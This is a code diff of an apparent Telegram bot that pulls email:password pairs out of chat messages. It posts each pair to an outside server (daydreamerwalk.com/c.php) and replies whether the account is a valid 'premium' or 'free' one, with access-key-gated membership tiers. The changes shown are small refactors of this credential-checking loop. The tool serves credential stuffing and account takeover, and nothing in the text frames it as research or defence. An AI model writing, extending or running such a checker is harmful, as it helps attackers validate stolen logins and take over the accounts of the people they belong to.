@@ -251,13 +251,13 @@ def main():
             results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", event.raw_text)
             key = findall(r"ACCESS [A-Z0-9]{16}", event.raw_text)
             haveKey = False
-            if len(key) == 1:
+            if len(key) >= 1:
                 key = key[0]
                 if key == ACCESS_KEY:
                     haveKey = True
             # Getting the sender infor to extract the username
-                user = await event.get_sender()
-                user = user.username
+            user = await event.get_sender()
+            user = user.username
             # Membership status
             membership = "𝙵𝚁𝙴𝙴"
             # Setting membership status based on the who accesses it
@@ -284,14 +284,14 @@ def main():
                     await event.reply(res)
                     return
             for result in results:
-                url = f"https://daydreamerwalk.com/c.php?e={result[0]}&p={result[1]}"
+                uEmail = result[0]
+                uPass = result[1]
+                url = f"https://daydreamerwalk.com/c.php?e={uEmail}&p={uPass}"
                 # Response from the server
                 response = requests.post(url=url)
-                # Password security: whether to hide or not
-                uPass = result[1]
                 # Response of whether the credentials are valid or invalid
+                # Password security: whether to hide or not
                 status = "ᴄʀᴇᴅᴇɴᴛɪᴀʟꜱ ᴍɪꜱᴍᴀᴛᴄʜ ‼"
-                print(response.text)
                 if "premium" in response.text:
                     status = "ᴀᴘᴘʀᴏᴠᴇᴅ ᴘʀᴇᴍɪᴜᴍ ✅"
                     if not event.is_private:
@@ -303,7 +303,6 @@ def main():
                 elif "good" in response.text:
                     status = "ꜰʀᴇᴇ ᴀᴄᴄᴏᴜɴᴛ ✅"
                 # Creating Response Format
-                uEmail = result[0]
                 if len(uEmail) > 25:
                     uEmail = f"\n{uEmail}"
                 if len(uPass) > 22:
